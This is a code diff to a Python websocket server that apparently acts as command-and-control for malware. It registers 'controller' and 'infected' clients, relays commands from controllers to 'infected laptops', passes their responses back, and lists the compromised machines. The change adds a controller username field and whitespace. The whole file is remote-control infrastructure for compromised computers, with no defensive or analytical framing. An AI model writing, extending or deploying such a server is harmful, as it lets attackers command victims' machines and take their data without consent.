@@ -23,6 +23,7 @@ messages = []
 # Message retention time (1 day)
 MESSAGE_RETENTION_PERIOD = timedelta(days=1)
 
+
 # Cleanup old messages
 def cleanup_old_messages():
     global messages
@@ -30,8 +31,9 @@ def cleanup_old_messages():
     messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
     logger.info("Cleaned up messages.", extra={"remaining_messages": len(messages)})
 
+
 # Register a new client or return an existing client
-async def register_client(websocket, role, client_id=None, data=None):
+async def register_client(websocket, role, client_id=None, data=None, username=None):
     # If no client_id is provided, assign a new one
     if not client_id:
         client_id = str(uuid.uuid4())
@@ -41,15 +43,17 @@ async def register_client(websocket, role, client_id=None, data=None):
         'websocket': websocket,
         'last_seen': datetime.now(),
         'role': role,
-        'data': data,
+        'data': data,  # Data for infected clients
+        'username': username,  # Username for controllers
         'messages': [],
         'disconnected_at': None
     }
-    logger.info("Registered or updated client.", extra={"role": role, "client_id": client_id, "data": data})
-    
+    logger.info("Registered or updated client.", extra={"role": role, "client_id": client_id, "username": username, "data": data})
+
     # Send the client ID back to the client
     await websocket.send(json.dumps({"type": "assign_id", "client_id": client_id}))
     return client_id
+
 
 # Handle messages from controllers
 async def handle_controller_messages(websocket, client_id):
@@ -78,6 +82,7 @@ async def handle_controller_messages(websocket, client_id):
             logger.error(f"Error handling controller message from {client_id}: {e}", exc_info=True)
             break
 
+
 # Handle messages from infected laptops
 async def handle_infected_messages(websocket, client_id):
     while True:
@@ -102,6 +107,7 @@ async def handle_infected_messages(websocket, client_id):
             logger.error(f"Error handling infected message from {client_id}: {e}", exc_info=True)
             break
 
+
 # Relay messages to the appropriate handler
 async def relay_messages(websocket, client_id, role):
     try:
@@ -112,6 +118,7 @@ async def relay_messages(websocket, client_id, role):
 
     except Exception as e:
         logger.error(f"Error in relay_messages for client {client_id} with role {role}: {e}", exc_info=True)
+
 
 # Handle commands from controllers
 async def handle_command(data, client_id):
@@ -143,6 +150,7 @@ async def handle_command(data, client_id):
     else:
         logger.warning("Target not connected.", extra={"target_id": target_id})
 
+
 # Handle responses from infected laptops
 async def handle_response(data):
     command_id = data['command_id']
@@ -162,6 +170,7 @@ async def handle_response(data):
         await origin_ws.send(json.dumps(msg))
         logger.info("Response relayed to origin.", extra={"origin_id": origin_id, "msg": msg})
 
+
 # Send the list of clients to the controller
 async def send_client_list(websocket):
     # Convert datetime to ISO 8601 strings before sending
@@ -169,7 +178,8 @@ async def send_client_list(websocket):
         client_id: {
             'last_seen': client['last_seen'].isoformat(),  # Convert datetime to string
             'role': client['role'],
-            'data': client.get('data', {})
+            'username': client.get('username'),  # Username for controllers
+            'data': client.get('data', {})  # Data for infected laptops
         }
         for client_id, client in clients.items()
     }
@@ -186,24 +196,22 @@ async def send_client_list(websocket):
     except Exception as e:
         logger.error(f"Error sending client list: {e}", exc_info=True)
 
-    response = {'type': 'infected_list', 'infected_laptops': clients_list}
-    await websocket.send(json.dumps(response))
-    logger.info("Sent client list to controller.", extra={"clients_list": clients_list})
 
 # Connection handler
 async def connection_handler(websocket, path):
     client_id = None
     try:
-        # Step 1: Receive the initial message (contains role and optionally client_id)
+        # Step 1: Receive the initial message (contains role, username, and optionally client_id)
         initial_message = await websocket.recv()
         initial_data = json.loads(initial_message)
 
         role = initial_data['role']
         client_id = initial_data.get('client_id')  # Client ID may be provided by a returning client
-        data = initial_data.get('data') if role == 'infected' else None
+        username = initial_data.get('username') if role == 'controller' else None  # Only for controllers
+        data = initial_data.get('data') if role == 'infected' else None  # Only for infected laptops
 
         # Step 2: Register or assign a client ID
-        client_id = await register_client(websocket, role, client_id, data)
+        client_id = await register_client(websocket, role, client_id, data, username)
 
         # Step 3: Relay messages from the client
         await relay_messages(websocket, client_id, role)
@@ -215,6 +223,7 @@ async def connection_handler(websocket, path):
 
     except Exception as e:
         logger.error("Exception occurred in connection handler.", exc_info=True, extra={"client_id": client_id})
+
 
 # Get the local IP address of the server
 def get_local_ip():
@@ -228,6 +237,7 @@ def get_local_ip():
         s.close()
     return ip
 
+
 # Start the server
 async def main():
     ip_address = get_local_ip()
@@ -237,6 +247,7 @@ async def main():
 
     async with websockets.serve(connection_handler, "0.0.0.0", port):
         await asyncio.Future()  # Run forever
+
 
 if __name__ == "__main__":
     asyncio.run(main())
